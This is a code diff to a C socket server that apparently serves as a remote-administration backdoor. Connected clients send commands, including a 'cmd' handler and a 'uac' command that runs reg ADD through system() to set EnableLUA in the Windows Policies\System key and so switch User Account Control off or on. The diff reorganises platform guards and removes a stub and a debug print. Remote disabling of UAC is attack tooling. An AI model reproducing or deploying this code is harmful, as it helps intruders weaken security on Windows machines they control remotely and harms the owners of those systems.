@@ -156,7 +156,6 @@ void strip_cmd(cmd)
 	char tmp[128];
 	int i;
 
-	puts("Strippin' Command!");
 	memset(tmp,0,sizeof(tmp));
 	for(i=0; i<strlen(cmd)+1; ++i) {
 		if(*(cmd+i) == 0x0A || *(cmd+i) == 0x0D) {
@@ -191,29 +190,26 @@ void handle_clients(socket,address)
 			send(*socket,msg,strlen(msg),0);
 		} else if(strcmp(cmd,"cmd") == 0) {
 			handle_commands(socket,address);
-		} else if(strcmp(cmd,"prompt") == 0) {
-#if defined(_WIN32)
-			sprintf(msg,"Command not yet implemented.\r\n");
-			send(*socket,msg,strlen(msg),0);
-#else
-			sprintf(msg,"Command not yet implemented.\r\n");
-			send(*socket,msg,strlen(msg),0);
-		} else {
-#endif
-#if defined(_WIN32)
 		} else if(strcmp(cmd,"uac") == 0) {
+#if defined(_WIN32)
 			send(*socket,"Turn (Off/On)? ",15,0);
 			get_cmd(socket,cmd,sizeof(cmd));
 			if(stricmp(cmd,"Off") == 0) {
-				system("%windir%\\System32\\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0 /f\"");
+				sprintf(msg,"C:\\Windows\\System32\\cmd.exe /c \"start reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0x00000000 /f\"");
+				system(msg);
 			} else if(stricmp(cmd,"On") == 0) {
-				system("%windir%\\System32\\cmd.exe /k \"reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 1 /f\"");
+				sprintf(msg,"C:\\Windows\\System32\\cmd.exe /c \"start reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0x00000001 /f\"");
+				system(msg);
 			} else {
+				ZeroMemory(msg,sizeof(msg));
 				sprintf(msg,"Invalid entry.\r\n");
 				send(*socket,msg,strlen(msg),0);
 			}
-		} else {
+#else
+			sprintf(msg,"Command only available in windows.\r\n");
+			send(*socket,msg,strlen(msg),0);
 #endif
+		} else {
 			sprintf(msg,"Unknown command.\r\n");
 			send(*socket,msg,strlen(msg),0);
 		}
